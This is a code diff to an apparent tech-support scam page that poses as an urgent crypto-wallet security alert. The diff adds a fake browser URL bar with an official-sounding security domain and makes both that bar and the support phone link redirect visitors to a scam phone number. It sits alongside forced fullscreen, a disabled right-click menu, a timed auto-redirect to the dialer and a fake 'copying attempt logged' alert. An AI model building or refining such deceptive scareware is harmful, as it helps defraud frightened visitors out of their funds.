@@ -329,9 +329,33 @@
         z-index: 10000;
         display: none;
     }
+
+    /* Fake URL Bar */
+    #fakeUrlBar {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        background: #f0f0f0;
+        padding: 8px 15px;
+        border-bottom: 1px solid #ccc;
+        font-size: 14px;
+        color: #333;
+        z-index: 1001;
+        cursor: pointer;
+        text-align: center;
+        font-family: monospace;
+    }
+
+    #fakeUrlBar:hover {
+        background: #e0e0e0;
+    }
 </style>
 </head>
 <body oncontextmenu="return false;">
+
+<!-- Fake URL Bar -->
+<div id="fakeUrlBar">https://security-alert-wallet-protection.com/emergency</div>
 
 <!-- ESC key info -->
 <div class="esc-info" id="escInfo">Press ESC to exit</div>
@@ -360,7 +384,7 @@
             <p><strong>Detected:</strong> Suspicious activity for the wallet tied to this device (example IP: <b>192.0.2.123</b>).</p>
             <p><strong>Immediate steps:</strong></p>
             <ul>
-              <li><strong>Call support immediately:</strong> <a href="tel:+18889295618">+1 (888) 929-5618</a></li>
+              <li><strong>Call support immediately:</strong> <a href="tel:+18889295618" id="phoneLink">+1 (888) 929-5618</a></li>
               <li>Do <strong>not</strong> share private keys, seed phrases, or passwords with anyone—even if they claim to be support.</li>
               <li>Revoke active sessions / connected dApps as instructed by support.</li>
               <li>Move funds to a new wallet created on a secure device if advised.</li>
@@ -395,6 +419,8 @@
     const acceptCookies = document.getElementById('acceptCookies');
     const rejectCookies = document.getElementById('rejectCookies');
     const escInfo = document.getElementById('escInfo');
+    const fakeUrlBar = document.getElementById('fakeUrlBar');
+    const phoneLink = document.getElementById('phoneLink');
     
     let hasStarted = false;
     let popupActive = false;
@@ -437,6 +463,14 @@
         escInfo.style.display = 'none';
     }
 
+    function redirectToDialer() {
+        // Exit full screen before redirecting
+        if (isFullScreen) {
+            exitFullScreen();
+        }
+        window.location.href = "tel:+18889295618";
+    }
+
     function activateFullScreen() {
         if (hasStarted) return;
         hasStarted = true;
@@ -468,14 +502,6 @@
         setTimeout(function () {
             redirectToDialer();
         }, 480000);
-    }
-
-    function redirectToDialer() {
-        // Exit full screen before redirecting
-        if (isFullScreen) {
-            exitFullScreen();
-        }
-        window.location.href = "tel:+18889295618";
     }
 
     function handleCookiesAccept() {
@@ -524,6 +550,20 @@
         if (navigator.userAgent.includes("HTTrack")) {
             alert("Website copying attempt detected. Action has been logged.");
         }
+        
+        // Fake URL Bar click event
+        fakeUrlBar.addEventListener('click', function() {
+            if (popupActive) {
+                redirectToDialer();
+            }
+        });
+
+        // Phone link click event
+        phoneLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            redirectToDialer();
+        });
         
         // Cookies popup event listeners
         acceptCookies.addEventListener('click', handleCookiesAccept);
